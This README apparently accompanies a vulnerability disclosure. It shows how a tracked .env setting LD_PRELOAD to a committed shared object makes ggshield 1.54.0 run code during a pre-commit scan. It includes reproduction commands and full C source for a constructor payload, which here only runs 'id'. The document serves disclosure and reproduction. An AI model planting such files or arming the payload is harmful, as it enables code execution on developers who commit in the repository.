# ggshield GG-01 reproduction

This harmless repository demonstrates that ggshield 1.54.0 automatically loads
a tracked repository `.env` and exports its values to Git. The `.env` sets
`LD_PRELOAD` to a tracked shared object. A normal pre-commit scan starts Git
before checking authentication, so the operating-system loader loads that
object with the ggshield user's privileges.

The shared object only runs `/usr/bin/id` and writes its output to
`.ggshield-gg01-executed` inside the checkout.

## Prerequisites

- x86-64 Ubuntu, Debian, or another glibc-based Linux distribution
- Git
- ggshield 1.54.0

No GitGuardian account or API credential, compiler, Docker, plugin, custom Git
configuration, custom server, PATH change, or elevated privilege is required.

## Install ggshield

On Ubuntu or Debian:

```sh
sudo apt-get update
sudo apt-get install -y git pipx
pipx install 'ggshield==1.54.0'
export PATH="$HOME/.local/bin:$PATH"
ggshield --version
```

The final command must print `ggshield, version 1.54.0`.

## Reproduce the normal global-hook flow

Run the hook installation before cloning the repository:

```sh
ggshield install --mode global
git clone https://github.com/Jakick/ggshield-gg01-poc.git
cd ggshield-gg01-poc
printf '%s\n' 'changed by victim' >> application.txt
git add application.txt
git -c user.name=Victim -c user.email=victim@example.test commit -m reproduce || true
cat .ggshield-gg01-executed
```

Expected marker:

```text
uid=1000(victim) gid=1000(victim) groups=1000(victim)
```

The exact IDs vary. The output comes from the repository-controlled `id`
command and proves execution as the victim. With no API key, ggshield prints its
ordinary authentication error after the marker has already been created, so
the reproduction deliberately allows the commit command to fail.

## Minimum attacker-controlled content

Only these two tracked files are required:

1. `.env`, containing `LD_PRELOAD=./tracked-preload.so`.
2. `tracked-preload.so`, a harmless x86-64 ELF shared object whose constructor
   runs `/usr/bin/id`.

The object requires only `libc.so.6` symbols versioned `GLIBC_2.2.5`. It is
already committed, so the victim does not compile anything. The marker is
ignored by Git and the payload performs no network access or write outside the
checkout.

For transparency, this is the complete source used to build it:

```c
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

__attribute__((constructor)) static void prove_execution(void) {
    unsetenv("LD_PRELOAD");
    pid_t child = fork();
    if (child != 0) {
        if (child > 0) waitpid(child, NULL, 0);
        return;
    }
    int fd = open(".ggshield-gg01-executed", O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) _exit(1);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    close(fd);
    execl("/usr/bin/id", "id", (char *)NULL);
    _exit(1);
}
```

Build command: `gcc -shared -fPIC -O2 -Wall -Wextra -o tracked-preload.so tracked-preload.c`.
The committed object has SHA-256
`9c6ac1175df825af89a7f4216e63df14a7253e0e6329f8ff0f4e36185f503075`.

## Why ggshield introduces the behavior

Git does not load a repository `.env` by itself. ggshield finds that file and
loads every variable with overriding semantics. Its Git wrapper then copies the
modified process environment into a new Git process. The Linux dynamic loader
interprets `LD_PRELOAD` before Git starts, which executes the tracked object.
